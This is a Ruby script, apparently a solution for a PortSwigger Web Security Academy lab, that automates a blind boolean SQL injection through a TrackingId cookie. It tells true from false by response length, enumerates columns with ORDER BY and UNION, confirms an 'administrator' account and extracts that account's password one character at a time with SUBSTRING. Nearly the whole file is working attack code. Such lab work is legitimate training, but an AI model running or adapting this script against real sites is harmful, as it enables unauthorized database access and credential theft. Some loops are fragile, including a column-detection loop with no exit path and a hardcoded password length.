require 'http'
require 'nokogiri'

flag = 0

url ="https://0a7100ef0372f6f680f5802300a00065.web-security-academy.net/"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (platform; rv:gecko-version) Gecko/gecko-trail Firefox/firefox-version"
	)


	
#1. Find out the differential behaviour depending upon TRUE and False
puts "========> Enumerating response length depending upon condition..."
arr = []
payload_set_1 = ["' AND 1=1-- -","' AND 1=2-- -"]

payload_set_1.each do |p|	
	resp2 = client.cookies(	
		:session => "QKD8ClbUHAAuqxHHAnf9MRRgDh54WdNw",
		:TrackingId => "Uwv6HkCA1ugT1nom#{URI.encode_uri_component(p)}"
		).get url
	arr << resp2.body.to_s.length
	puts "-> Payload #{p} : Content Length -> #{resp2.body.to_s.length}"
end

tr = arr[0]
fl = arr[1]

puts "-> True : #{tr}"
puts "-> False : #{fl}"

#3. Find out the number of returned columns
puts "========> Enumerating number of columns returned..."
flag = 0
count = 0

until flag==1
	resp3 = client.cookies(	
		:session => "QKD8ClbUHAAuqxHHAnf9MRRgDh54WdNw",
		:TrackingId => URI.encode_uri_component("Uwv6HkCA1ugT1nom' ORDER BY #{count}-- -")
		).get url
	length = resp3.body.to_s.length 
	if length==tr
		flag=1
	else
		count+=1	
	end
end

puts "-> Number of returned columns : #{count}"

# 4. Finding the column that returns text
puts ""
b = [] 
col_str=''
flag = 0
cols = count.times {b<<'a'}
b = b.join(',')
until flag==1 
		resp4 = client.cookies(	
			:session => "QKD8ClbUHAAuqxHHAnf9MRRgDh54WdNw",
			:TrackingId => URI.encode_uri_component("Uwv6HkCA1ugT1nom' UNION SELECT '#{b}'-- -")
			).get url
		length = resp4.body.to_s.length
		if length==tr
			flag=1
			puts '-> String returning columns found...'
		end
end

if flag==0
	puts "No string returning columns"
	exit
end

# 5. Confirming username
puts "=======> Confirming username..."
username = 'administrator'
flag = 0
payload_set_2 = URI.encode_uri_component("' AND (SELECT '#{username}' FROM users LIMIT 1)='#{username}'-- -")
resp5 = client.cookies(	
	:session => "QKD8ClbUHAAuqxHHAnf9MRRgDh54WdNw",
	:TrackingId => "Uwv6HkCA1ugT1nom#{payload_set_2}"
	).get url
	length = resp5.body.to_s.length
	
if length==tr
	flag=1
	puts "-> Username #{username} found !"
else
	puts "Username #{username} not found..."
end	


# 6. Confirm password length
puts "=========> Enumerating password length..."
payload_set_3 = "' AND (SELECT LENGTH(password) FROM users WHERE username='#{username}' LIMIT 1)"
flag = 0

# ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator' LIMIT 1)=20-- -

until flag==1
	(1..50).to_a.each do |l|
	
		resp6 = client.cookies(	
			:session => "QKD8ClbUHAAuqxHHAnf9MRRgDh54WdNw",
			:TrackingId => URI.encode_uri_component("Uwv6HkCA1ugT1nom#{payload_set_3}=#{l}-- -")
		).get url
	
		length = resp6.body.to_s.length
		if length==tr
			flag=1
			puts "-> Password Length is: #{l} Characters"
			pwlen = l
			break
		end	
	end
end

# 7. Enumerating password for the user 

chars = 'abcdefghijklmnopqrstuvwxyz1234567890'
password = ''

#' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- -

puts "========> Enumerating password..."
print "administrator:"
20.times do |p|
	chars.length.times do |s|
		resp7 = client.cookies(	
			:session => "QKD8ClbUHAAuqxHHAnf9MRRgDh54WdNw",
			:TrackingId => URI.encode_uri_component("Uwv6HkCA1ugT1nom' AND (SELECT SUBSTRING(password,#{p+1},1) FROM users WHERE username='#{username}' LIMIT 1)='#{chars[s]}'-- -")
		).get url
		length = resp7.body.to_s.length
		if length==tr
			password = password.concat "#{chars[s]}" 
			print "#{chars[s]}"
		end	
	end 
end	








